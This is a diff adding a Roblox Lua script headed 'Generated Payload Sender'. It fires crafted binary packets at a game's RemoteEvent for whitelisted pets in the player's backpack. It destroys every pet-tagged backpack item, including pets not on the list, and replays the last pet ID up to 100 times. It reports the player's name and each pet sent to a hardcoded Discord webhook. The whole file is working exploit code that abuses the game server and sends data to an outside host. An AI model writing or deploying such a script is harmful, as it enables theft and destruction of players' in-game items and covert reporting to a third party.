@@ -1,1 +1,82 @@
+-- Generated Payload Sender
+local PETS = {"Unicorn","Bald Eagle","Monkey","Owl","Frog","Golden Dragonfly","Bunny","Bee","Turtle","Ice Serpent","Butterfly","Firefly","Raccoon","Deer","Robin"}
+local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
 
+local Event = game:GetService("ReplicatedStorage"):FindFirstChild("SharedModules")
+    and game:GetService("ReplicatedStorage").SharedModules:FindFirstChild("Packet")
+    and game:GetService("ReplicatedStorage").SharedModules.Packet:FindFirstChild("RemoteEvent")
+
+local ALLOWED = {}
+for _, p in ipairs(PETS) do table.insert(ALLOWED, string.lower(p)) end
+
+local function buildPacket(petId)
+    local s = "!\\x01+\\x00\\x00\\xC0\\x04\\xD6&\\xF0A\\x1C\\x05\\x01\\x1C\\v\\aItemKey\\v$" .. petId .. "\\v\\x05Count\\x05\\x01\\v\\bCategory\\v\\x04Pets\\x00\\x00\\x00"
+    return buffer.fromstring(s)
+end
+
+local function sendWebhook(msg)
+    local req = (type(request) == "function" and request) 
+        or (type(http_request) == "function" and http_request) 
+        or (syn and type(syn.request) == "function" and syn.request) 
+        or (http and type(http.request) == "function" and http.request)
+    if req then
+        pcall(req, {
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode({content = msg})
+        })
+    end
+end
+
+local player = game:GetService("Players").LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+local totalFired = 0
+local lastPetId = nil
+
+sendWebhook("🚀 Script started by **" .. player.Name .. "**")
+
+while totalFired < 100 do
+    local items = backpack:GetChildren()
+    local anyProcessed = false
+    for _, item in ipairs(items) do
+        local petId = item:GetAttribute("PetId")
+        local petName = item:GetAttribute("Pet")
+        if petId and petName then
+            local lowerName = string.lower(petName)
+            local isAllowed = false
+            for _, allowed in ipairs(ALLOWED) do
+                if string.find(lowerName, allowed, 1, true) then
+                    isAllowed = true
+                    break
+                end
+            end
+            if isAllowed then
+                if Event then Event:FireServer(buildPacket(petId)) end
+                totalFired = totalFired + 1
+                lastPetId = petId
+                anyProcessed = true
+                sendWebhook("**Pet Sent**\\nName: `" .. petName .. "`\\nID: `" .. petId .. "`")
+                item:Destroy()
+                task.wait(10)
+            else
+                item:Destroy()
+            end
+        end
+    end
+    if #backpack:GetChildren() == 0 and totalFired < 100 then
+        if lastPetId then
+            for _ = 1, 100 - totalFired do
+                if Event then Event:FireServer(buildPacket(lastPetId)) end
+                totalFired = totalFired + 1
+                sendWebhook("🔄 Reused last pet ID")
+                task.wait(10)
+            end
+        else
+            break
+        end
+    end
+    if not anyProcessed then task.wait(0.5) end
+end
+
+sendWebhook("✅ Script finished. Fired " .. totalFired .. " packets.")
